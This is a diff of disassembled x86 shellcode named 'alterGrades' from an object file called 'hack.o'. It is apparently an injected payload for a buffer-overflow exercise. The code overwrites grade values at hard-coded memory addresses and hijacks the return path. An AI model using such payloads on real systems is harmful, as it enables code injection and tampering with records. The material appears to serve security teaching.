@@ -5,42 +5,43 @@ hack.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <alterGrades>:
-   0:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
-   6:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-   b:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  12:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  17:	05 90 01 00 00       	add    $0x190,%eax
-  1c:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
-  23:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  28:	05 20 03 00 00       	add    $0x320,%eax
-  2d:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  34:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  39:	05 b0 04 00 00       	add    $0x4b0,%eax
-  3e:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
-  45:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  4a:	05 40 06 00 00       	add    $0x640,%eax
-  4f:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  56:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  5b:	05 d0 07 00 00       	add    $0x7d0,%eax
-  60:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  67:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  6c:	05 60 09 00 00       	add    $0x960,%eax
-  71:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  78:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
-  7f:	8b 45 fc             	mov    -0x4(%ebp),%eax
-  82:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
-  88:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  8d:	01 d0                	add    %edx,%eax
-  8f:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  96:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  9b:	05 80 0c 00 00       	add    $0xc80,%eax
-  a0:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  a7:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  ac:	05 10 0e 00 00       	add    $0xe10,%eax
-  b1:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  b8:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
-  bd:	05 a0 0f 00 00       	add    $0xfa0,%eax
-  c2:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
-  c9:	81 c4 1c 01 00 00    	add    $0x11c,%esp
-  cf:	68 92 87 04 08       	push   $0x8048792
-  d4:	c3                   	ret    
+   0:	bf 00 00 00 00       	mov    $0x0,%edi
+   5:	be 00 00 00 00       	mov    $0x0,%esi
+   a:	bb f4 af 70 55       	mov    $0x5570aff4,%ebx
+   f:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  14:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+  1b:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  20:	05 90 01 00 00       	add    $0x190,%eax
+  25:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
+  2c:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  31:	05 20 03 00 00       	add    $0x320,%eax
+  36:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+  3d:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  42:	05 b0 04 00 00       	add    $0x4b0,%eax
+  47:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
+  4e:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  53:	05 40 06 00 00       	add    $0x640,%eax
+  58:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  5f:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  64:	05 d0 07 00 00       	add    $0x7d0,%eax
+  69:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  70:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  75:	05 60 09 00 00       	add    $0x960,%eax
+  7a:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  81:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
+  88:	8b 45 fc             	mov    -0x4(%ebp),%eax
+  8b:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
+  91:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  96:	01 d0                	add    %edx,%eax
+  98:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  9f:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  a4:	05 80 0c 00 00       	add    $0xc80,%eax
+  a9:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  b0:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  b5:	05 10 0e 00 00       	add    $0xe10,%eax
+  ba:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  c1:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  c6:	05 a0 0f 00 00       	add    $0xfa0,%eax
+  cb:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
+  d2:	68 92 87 04 08       	push   $0x8048792
+  d7:	c3                   	ret    
